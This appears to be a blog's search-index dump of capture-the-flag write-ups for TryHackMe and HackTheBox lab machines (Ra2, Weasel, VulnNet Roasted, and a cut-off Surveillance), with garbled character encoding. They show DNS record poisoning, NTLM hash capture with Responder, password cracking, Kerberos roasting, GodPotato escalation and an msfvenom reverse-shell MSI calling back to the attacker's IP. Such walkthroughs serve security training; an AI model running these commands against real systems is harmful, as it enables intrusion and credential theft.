ðŸ”½![Image](Pasted%20image%2020240308212346.png)_Index file system_I then downloaded the cert.pfx file and can't able to access web.config file so I moved on to opening the file to convert it into its private key and certificate key with OpenSSL Tool but it is password protected .![Image](Pasted%20image%2020240308212854.png)_Openssl command_Now to decrypt the password of cert.pfx file I got a tool online called as [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) .I downloaded it and given it `-d` as dictionary file to bruteforce from in our case I used `rockyou.txt` file and `-b` to enable bruteforce option. ![Image](Pasted%20image%2020240308155743.png)_crackpkcs12 Tool_I got the password so lets extract the certificate and private keys both ðŸ”½I used same password in all the inputs : ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ openssl pkcs12 -in cert.pfx -clcerts -nokeys -out certificate.crtEnter Import Password:â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ openssl pkcs12 -in cert.pfx -nocerts -out private.key -nodesEnter Import Password:```{: .nolineno}Now I have both the keys so lets update the DNS records for `selfservice.windcorp.thm` subdomain with our attacker IP address and then I will be including the certificate and private key in responder Tool configuration so that when I hit the subdomain or its directories I could get a ticket on responder in our attacker machine.## DNS Cache Poisoning & ResponderToo achieve this, I can perform DNS cache poisoning.> DNS cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites.{: prompt-tips }So for dynamic DNS update utility I will be using : #### nsupdate Tool ðŸ”½| Commands | Usage || -------- | ----- || `update add domain-name ttl class type data` | This command adds a new resource record with the specified ttl, class, and data. || `update delete domain-name ttl class type data` | This command deletes any resource records named domain-name. If type and data are provided, only matching resource records are removed. The Internet class is assumed if class is not supplied. The ttl is ignored, and is only allowed for compatibility. || `send` | This command sends the current message. This is equivalent to entering a blank line. || `show` | This command displays the current message, containing all of the prerequisites and updates specified since the last send. |![Image](Pasted%20image%2020240308222201.png)_nsupdate Tool_```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ nsupdate> server 10.10.66.76> update delete selfservice.windcorp.thm> send> update add selfservice.windcorp.thm 12345 A 10.11.75.200> send> quit```{: .nolineno}Lets confirm the DNS record that is been modified through dig Tool.![Image](Pasted%20image%2020240308222332.png)_dig Tool_Also when I checked the DNS record of domain I got the first FLAG ðŸ”½![Image](Pasted%20image%2020240309104514.png)_dig Tool on domain : windcorp.thm_### Responder Tool ðŸ”½Now I see its time to update the responder Tool configuration file : ```bashsudo nano /etc/responder/Responder.conf```{: .nolineno}then update this under [ HTTPS Server ] section ðŸ”½![Image](Pasted%20image%2020240308220114.png)_Update certificates and private keys location_Now run responder and catch the hash that will get display when the you hit this URL `https://selfservice.windcorp.thm/` â©![Image](Pasted%20image%2020240309102028.png)_Responder Tool_Now I got this hash â©![Image](Pasted%20image%2020240309102119.png)_NTLMv2 hash_Lets crack this hash with John the Ripper Tool ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt -format=netntlmv2 Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status (edwardle) 1g 0:00:00:28 DONE (2024-03-09 10:23) 0.03521g/s 504969p/s 504969c/s 504969C/s !SkicA!..!@#fuckUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Now I have the password of user edwardle so lets see its privileges towards services ðŸ”»I used this credentials into the powershell directory of subdomain `fire.windcorp.thm` ðŸ”½![Image](Pasted%20image%2020240309112232.png)_powershell directory_## WebShell ðŸ”½In result to that I got a webshell of powershell ðŸ”½![Image](Pasted%20image%2020240309105152.png)_Webshell with Shell as powershell_Lets enumerate further ðŸ”½I checked the privileges of this user and I got SeImpersonatePrivilege Enabled so lets exploit that , but first I need to check the windows version.![Image](Pasted%20image%2020240309111330.png)_Get-ComputerInfo command_Since this system is `Windows Server 2019 Standard` with version as `1809` that means I can use GodPotato Tool over here â©You can download this tool from here [GodPotato](https://github.com/BeichenDream/GodPotato) .![Image](Pasted%20image%2020240309111530.png)_GodPotato Tool_Since this tool is working fine so lets transfer the nc.exe Tool and start the reverse shell as **nt Authority\\System** .![Image](Pasted%20image%2020240309111903.png)_Reverse Shell through GodPotato Tool_I got the response like this ðŸ”½```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ rlwrap nc -lvnp 4444listening on [any] 4444 ...connect to [10.11.75.200] from (UNKNOWN) [10.10.66.76] 57682Microsoft Windows [Version 10.0.17763.1158](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamiC:\\Windows\\system32>echo %username%echo %username%FIRE$C:\\Windows\\system32>hostnamehostnameFireC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 84E1-0562C:.| .sparkExt.properties| sip-communicator.properties| +---.docker| \\---application-template| \\---logs| com.docker.backend.log| +---3D Objects+---Contacts+---Desktop| Flag 3.txt| +---Documents| | Adusers.ps1| | GetRandomUsers.ps1| | | +---AntSys| | bk_login.jpg| | GlobalSet.XML| | skin.ini| | | +---BigAnt5| | +---Data| | | \\---9A711E93-D71F-EABB-8ADF-0802499EF506| | | \\---102| | | | 9A711E93-D71F-EABB-8ADF-0802499EF506.db| | | | | | | \\---PlugImage| | | board.png| | | board_12.png| | | pan_14.png| | | | | \\---log| | 20200501AntDownLoadfile.log| | Ant_UIBase.txt| | ba20200501-003821.4288| | | +---Downloads| +---My_Received_Files| | test.html| | | \\---Zoom| \\---2020-04-30 10.54.01 My Meeting 95182479676+---Downloads| rocketchat-setup-2.17.9 (1).exe| +---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>C:\\Users\\Administrator>type \"Desktop\\Flag 3.txt\"type \"Desktop\\Flag 3.txt\"THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Weasel", "url": "/posts/Weasel/", "categories": "TryHackMe", "tags": "Windows, PrivEsc", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Weasel]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.161.35 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-0...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Weasel]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.161.35 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 21:07 ISTNmap scan report for 10.10.161.35Host is up (0.18s latency).Not shown: 65520 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey: | 2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)| 256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)|_ 256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: DEV-DATASCI-JUP| NetBIOS_Domain_Name: DEV-DATASCI-JUP| NetBIOS_Computer_Name: DEV-DATASCI-JUP| DNS_Domain_Name: DEV-DATASCI-JUP| DNS_Computer_Name: DEV-DATASCI-JUP| Product_Version: 10.0.17763|_ System_Time: 2024-03-03T15:43:45+00:00|_ssl-date: 2024-03-03T15:43:55+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=DEV-DATASCI-JUP| Not valid before: 2024-03-02T15:32:27|_Not valid after: 2024-09-01T15:32:275985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.08888/tcp open http Tornado httpd 6.0.3| http-robots.txt: 1 disallowed entry |_/ | http-title: Jupyter Notebook|_Requested resource was /login?next=%2Ftree%3F|_http-server-header: TornadoServer/6.0.347001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-03-03T15:43:50|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required```{: .nolineno}## SMB Enumeration â¤µï¸With netexec Tool I check smb shares ->![Image](Pasted%20image%2020240303225118.png)Lets access datasci-team share ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Weasel]â””â”€$ smbclient //10.10.161.35/datasci-team -U Anonymous Password for [WORKGROUP\\Anonymous]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Sun Mar 3 21:12:45 2024 .. D 0 Sun Mar 3 21:12:45 2024 .ipynb_checkpoints DA 0 Thu Aug 25 20:56:47 2022 Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv A 146 Thu Aug 25 20:56:46 2022 misc DA 0 Thu Aug 25 20:56:47 2022 MPE63-3_745-757.pdf A 414804 Thu Aug 25 20:56:46 2022 papers DA 0 Thu Aug 25 20:56:47 2022 pics DA 0 Thu Aug 25 20:56:47 2022 requirements.txt A 12 Thu Aug 25 20:56:46 2022 weasel.ipynb A 4308 Thu Aug 25 20:56:46 2022 weasel.txt A 51 Thu Aug 25 20:56:46 2022\t\t15587583 blocks of size 4096. 8949568 blocks availablesmb: \\> recurse onsmb: \\> prompt offsmb: \\> mget *getting file \\Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv of size 146 as Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)getting file \\MPE63-3_745-757.pdf of size 414804 as MPE63-3_745-757.pdf (186.6 KiloBytes/sec) (average 141.5 KiloBytes/sec)```{: .nolineno}## Web Enumeration â¤µï¸![Image](Pasted%20image%2020240303224213.png)![Image](Pasted%20image%2020240303224302.png)I got the ssh private key of user dev-datasci-lowpriv so lets ssh into the shell ðŸ”½## SSH Shell â¤µï¸```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Weasel]â””â”€$ ssh -i id_rsa dev-datasci-lowpriv@10.10.161.35Microsoft Windows [Version 10.0.17763.3287](c) 2018 Microsoft Corporation. All rights reserved.dev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>whoamidev-datasci-jup\\dev-datasci-lowprivdev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>whoami /allUSER INFORMATION----------------User Name SID=================================== ======================================dev-datasci-jup\\dev-datasci-lowpriv S-1-5-21-2336295375-1619315875-398172279-1000GROUP INFORMATION-----------------Group Name Type SID Attributes====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enableddev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>tree /f /aFolder PATH listing Volume serial number is 8AA3-53D1C:.+---.ssh| authorized_keys| id_ed25519| id_ed25519.pub|+---3D Objects+---Contacts+---Desktop| python-3.10.6-amd64.exe| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| id_ed25519.pub|+---3D Objects+---Contacts+---Desktop| python-3.10.6-amd64.exe| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videosdev-datasci-lowpriv@DEV-DATASCI-JUP C:\\Users\\dev-datasci-lowpriv>```{: .nolineno}I then uploaded winpeas.exe Tool into this machine with certutil.exe Tool.I got this credential ->![Image](Pasted%20image%2020240303221937.png)also I got one major vulnerability that can be exploited with any user privilege ->![Image](Pasted%20image%2020240303224824.png)AlwaysInstallElevated Privileges are Enabled so lets exploit that ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Weasel]â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.75.200 LPORT=445 -f msi -o shell.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of msi file: 159744 bytesSaved as: shell.msi```{: .nolineno}![Image](Pasted%20image%2020240303223742.png)```powershellC:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 8AA3-53D1C:.+---.ssh| authorized_keys| id_ed25519| id_ed25519.pub| +---.vscode| | argv.json| | | \\---extensions| \\---dracula-theme.theme-dracula-2.24.2| | .gitignore| | .vsixmanifest| | CHANGELOG.md| | icon.png| | INSTALL.md| | LICENSE.txt| | package.json| | README.md| | screenshot.png| | | \\---theme| dracula-soft.json| dracula.json| +---3D Objects+---Contacts+---Desktop| banner.txt| ChromeSetup.exe| python-3.10.6-amd64.exe| root.txt| Ubuntu2004-220404.appxbundle| Visual Studio Code.lnk| +---Documents+---Downloads| Microsoft.WindowsTerminalPreview_Win10_1.15.2282.0_8wekyb3d8bbwe.msixbundle| python-3.10.6-amd64.exe| Ubuntu2004-220404.appxbundle| Unconfirmed 415620.crdownload| VSCodeUserSetup-x64-1.70.2.exe| +---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Vulnnet Roasted", "url": "/posts/VulnNet-Roasted/", "categories": "TryHackMe", "tags": "Active Directory, ASREPRoast, GetUserSPNs.py, GetNPUsers.py, PrivEsc, SMB, Kerberosting, icacls, recon", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.138.220 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.138.220 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 21:26 ISTNmap scan report for 10.10.138.220Host is up (0.20s latency).Not shown: 65516 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-26 16:00:12Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49665/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049673/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPCService Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required|_clock-skew: -1s| smb2-time: | date: 2024-02-26T16:01:04|_ start_date: N/A```{: .nolineno}## SMB Enumeration â¤µï¸I got this domain name from this null credentials login attempt ðŸ”½![Image](Pasted%20image%2020240226221215.png)_Domain Name is â–¶ï¸ vulnnet-rst.local_Lets see the share access with Anonymous login or not ðŸ”½![Image](Pasted%20image%2020240226221107.png)_READ Access on smb shares_> If I get the **IPC$** share access that means that I can enumerate users through netexec tool.{: .prompt-tip }I got the usernames and the group names like this ðŸ”½![Image](Pasted%20image%2020240226215905.png)_User and Group enum with netexec_Lets collect them in a file ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ cat a.txt| cut -d '\\' -f 2 | grep SidTypeUser | awk '{print $1}'AdministratorGuestkrbtgtWIN-2BO8M1OE1M1$enterprise-core-vna-whitehatt-skidj-goldenhandj-leet```{: .nolineno}I then performed **AS-REP-ROASTING** using `GetNPUsers.py` Tool from impackets and I got this result ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'vulnnet-rst.local/' -dc-ip 10.10.138.220 -request -usersfile users.txtImpacket v0.11.0 - Copyright 2023 Fortra[-] User Administrator does not have UF_DONT_REQUIRE_PREAUTH set[-] User Guest does not have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User WIN-2BO8M1OE1M1$ does not have UF_DONT_REQUIRE_PREAUTH set[-] User enterprise-core-vn does not have UF_DONT_REQUIRE_PREAUTH set[-] User a-whitehat does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:29348c9e50198d204c7491fd8dbba0e1$493e494302848c63a455af3884030a662b7c692db761741ba02ba13d92444ff0e53a3bc48b1e7269753da98c823c16fb98da95228c4b7ad6b4afc9c0a5e0df950ef6344a53fce85095736b4f6776e95459f6c661ce99caeae0a6e1a181cc342fd0012ec5f045f5a758ede9dde10a926fa119e43a4782b581bd3cd95fdc70b3da473d41c7374f0be174b6e559df37fcbeedb1a4c45a980c2fdee0864bbb0fb658502f9af741732a991d73217cb71d540576b6e0491abd5f0ba97bd43a01fc020dc786cc62475808a7cdb28249adb91f6ed1f7aa5931f2f3912176e7d1bd5c2770f940866ab2909c9b501671938cfc18516fa4d66c7cd7[-] User j-goldenhand does not have UF_DONT_REQUIRE_PREAUTH set[-] User j-leet does not have UF_DONT_REQUIRE_PREAUTH set```{: .nolineno}Now I will be using John The Ripper to crack this hash value ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL) 1g 0:00:00:09 DONE (2024-02-26 22:08) 0.1003g/s 318806p/s 318806c/s 318806C/s Use the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Now lets see what privileges does this user got ðŸ”½![Image](Pasted%20image%2020240226221910.png)_Some more Shares READ access now_Now I have a users credentials so lets try to enumerate the SPN ticket of a user if I could using impacket tool `GetUserSPNs.py` ðŸ”½![Image](Pasted%20image%2020240227132041.png)_SPN ticket of user enterprise-core-vn_Lets crack this ticket with John The Ripper again ðŸ”½![Image](Pasted%20image%2020240227132321.png)_Got the Password of user enterprise-core-vn_Lets see the privileges of this user with netexec Tool â¬![Image](Pasted%20image%2020240227132808.png)_Got Access to winrm session !_Lets have a winrm session ðŸ”»### WINRM SHELL â©```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ evil-winrm -i 10.10.32.88 -u 'enterprise-core-vn' -p ''Evil-WinRM shell v3.5*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\enterprise-core-vn>*Evil-WinRM* PS C:\\Users\\enterprise-core-vn> tree /f /aFolder PATH listingVolume serial number is 58D0-66AAC:.+---Desktop| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\enterprise-core-vn> cat Desktop\\user.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\enterprise-core-vn> ```{: .nolineno}Now I looked into SMB shares for some new file access ðŸ”½```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ smbclient //10.10.168.48/SYSVOL -U enterprise-core-vnPassword for [WORKGROUP\\enterprise-core-vn]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Fri Mar 12 00:49:49 2021 .. D 0 Fri Mar 12 00:49:49 2021 vulnnet-rst.local Dr 0 Fri Mar 12 00:49:49 2021\t\t8771839 blocks of size 4096. 4555371 blocks availablesmb: \\> cd vulnnet-rst.local\\smb: \\vulnnet-rst.local\\> ls . D 0 Fri Mar 12 00:53:40 2021 .. D 0 Fri Mar 12 00:53:40 2021 DfsrPrivate DHSr 0 Fri Mar 12 00:53:40 2021 Policies D 0 Fri Mar 12 00:50:26 2021 scripts D 0 Wed Mar 17 04:45:49 2021\t\t8771839 blocks of size 4096. 4555371 blocks availablesmb: \\vulnnet-rst.local\\> cd scriptssmb: \\vulnnet-rst.local\\scripts\\> ls . D 0 Wed Mar 17 04:45:49 2021 .. D 0 Wed Mar 17 04:45:49 2021 ResetPassword.vbs A 2821 Wed Mar 17 04:48:14 2021\t\t8771839 blocks of size 4096. 4555371 blocks availablesmb: \\vulnnet-rst.local\\scripts\\> get ResetPassword.vbs getting file \\vulnnet-rst.local\\scripts\\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)smb: \\vulnnet-rst.local\\scripts\\> exit```{: .nolineno}I downloaded this **ResetPassword.vbs** and found the credentials for a new user ðŸ”»```bashstrUserNTName = \"a-whitehat\"strPassword = \"\"```{: .nolineno}Lets see its privileges in bloodhound also ðŸ”½![Image](Pasted%20image%2020240227195623.png)_BloodHound ingestor_And from bloodhound I got that this user is a part of Domain Admin group directly ðŸ”½![Image](Pasted%20image%2020240227195822.png)_Bloodhound pattern map_That means I am Administrator technically so lets access the flag now ðŸ”½```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]â””â”€$ evil-winrm -i 10.10.168.48 -u 'a-whitehat' -p '' Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\a-whitehat\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\a-whitehat> tree /f /aFolder PATH listingVolume serial number is 58D0-66AAC:.+---Desktop+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\a-whitehat> net user a-whitehatUser name a-whitehatFull Name Alexa WhitehatCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 3/11/2021 11:47:12 AMPassword expires NeverPassword changeable 3/12/2021 11:47:12 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon NeverLogon hours allowed AllLocal Group MembershipsGlobal Group memberships *Domain Admins *Domain UsersThe command completed successfully.*Evil-WinRM* PS C:\\Users\\a-whitehat> cd ..*Evil-WinRM* PS C:\\Users> cd Administrator*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 58D0-66AAC:.+---3D Objects+---Contacts+---Desktop| system.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop\\system.txtAccess to the path 'C:\\Users\\Administrator\\Desktop\\system.txt' is denied.At line:1 char:1+ cat Desktop\\system.txt+ ~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\Users\\Admini...ktop\\system.txt:String) [Get-Content], UnauthorizedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I can't access system.txt file so lets check the permissions of this file ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\Administrator> icacls Desktop\\system.txtDesktop\\system.txt NT AUTHORITY\\SYSTEM:(F) VULNNET-RST\\Administrator:(F)Successfully processed 1 files; Failed processing 0 files*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}Now I see that I am user **a-whitehat** so I don't have access to this file but I can change permissions like this ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\Administrator> icacls C:\\Users\\Administrator\\Desktop\\system.txt /grant a-whitehat:fprocessed file: C:\\Users\\Administrator\\Desktop\\system.txtSuccessfully processed 1 files; Failed processing 0 files*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop\\system.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\Administrator> icacls Desktop\\system.txtDesktop\\system.txt VULNNET-RST\\a-whitehat:(F) NT AUTHORITY\\SYSTEM:(F) VULNNET-RST\\Administrator:(F)Successfully processed 1 files; Failed processing 0 files*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}For Administrator shell I could run `secretsdump.py` that will extract the `NTLM` hash for all the users but I am happy with **a-whitehat** user .I am Domain Admin now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Surveillance", "url": "/posts/Surveillance/", "categories": "HackTheBox", "tags": "Public Exploit, Port Forwarding, PrivEsc, Password Cracking", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.245 -PnNmap scan report for 10.10.11.245Host is up (0.29s late...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.245 -PnNmap scan report for 10.10.11.245Host is up (0.29s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open tcpwrapped| ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)|_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)80/tcp open tcpwrapped|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)20485/tcp filtered unknown56302/tcp filtered unknown```{: .nolineno}## Web Enumeration â¤µï¸Upon checking port 80 and being redirected to `surveillance.htb`, I set the hosts file and loaded the 